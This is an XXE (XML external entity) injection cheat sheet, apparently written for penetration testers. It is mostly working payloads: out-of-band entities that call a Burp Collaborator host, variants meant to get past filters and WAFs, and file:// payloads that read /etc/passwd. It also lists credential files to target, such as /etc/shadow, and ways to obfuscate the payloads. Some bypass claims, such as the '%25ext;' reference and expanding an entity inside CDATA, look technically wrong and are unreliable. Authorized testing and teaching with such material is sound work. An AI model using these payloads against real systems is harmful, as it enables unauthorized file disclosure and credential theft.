### **Types of XXE Vulnerabilities**

- **Blind XXE**: No visible output, but external requests (DNS/HTTP) can be detected using tools like Burp Collaborator.
- **Reflected XXE**: The XML payload is echoed in the response.
- **Stored XXE**: Malicious XML is stored and executed later.
- **File-Based XXE**: Exploits XML parsers that handle local files (e.g., reading sensitive files like `/etc/passwd`).

---

## **Basic XXE Payloads**

### **Basic XXE (External Entity)**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "<http://collaborator-url.oastify.com>">
]>
<foo>&xxe;</foo>

```

- **Purpose**: Defines an external entity `xxe`, triggering a request to your Burp Collaborator if vulnerable.

---

### **Parameter Entity Injection (Bypass Filters)**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "<http://collab-url.oastify.com>">
  %ext;
]>
<foo>1</foo>

```

- **Purpose**: Uses a parameter entity to bypass filters blocking standard entities.

---

### **Double URL Encoding (WAF Bypass)**

```xml
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "<http://collab-url.oastify.com>">
  %25ext;
]>

```

- **Purpose**: Double encoding `%25ext;` bypasses WAFs or poorly decoded parsers.

---

### **CDATA Section (For Edge Parsers)**

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "<http://collab-url.oastify.com>">
]>
<foo><![CDATA[&xxe;]]></foo>

```

- **Purpose**: Wraps the entity call in `CDATA` to bypass parsers that treat CDATA sections differently.

---

## **XXE Exploitation with Local Files (file://)**

### **Reading Local Files Using file://**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

```

- **Purpose**: Attempts to load a local file (`/etc/passwd`) on the system. Reveals sensitive data if successful.

---

### **Common Files to Target**

- `/etc/passwd` (Linux)
- `/etc/shadow` (Linux)
- `C:\\Windows\\System32\\drivers\\etc\\hosts` (Windows)
- `C:\\Windows\\win.ini` (Windows)

---

### **File Disclosure with Parameter Injection**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  %file;
]>
<foo></foo>

```

- **Purpose**: Uses a parameter entity (`%file;`) to load and disclose local files.

---

## **Obfuscation & Bypass Techniques**

- **HTML Encoding**: Encode `<!ENTITY` as `&lt;!ENTITY` to bypass filters.
- **Unicode Obfuscation**: Replace `SYSTEM` with `SYST%E2%80%8EM` (Unicode encoding).
- **Comments in Entity Declaration**: Use comments like `<!ENTITY<!--comment--> xxe SYSTEM ...>` to evade detection.
- **Whitespace and Line Breaks**: Add spaces or newlines to the `<!ENTITY>` declaration to bypass filters.

---

## **Tips & Advanced Techniques**

- **Monitor Burp Collaborator**: Track DNS/HTTP requests to confirm XXE exploitation.
- **Test Multiple Payloads**: Try different entity types and content types (`application/xml`, `text/xml`).
- **Invisible Output ≠ No Vulnerability**: Even without visible output, look for external calls (via Burp Collaborator).
- **Local File Disclosure**: Always check for file-based XXE in XML parsers (file uploads, SOAP, XML-RPC).

---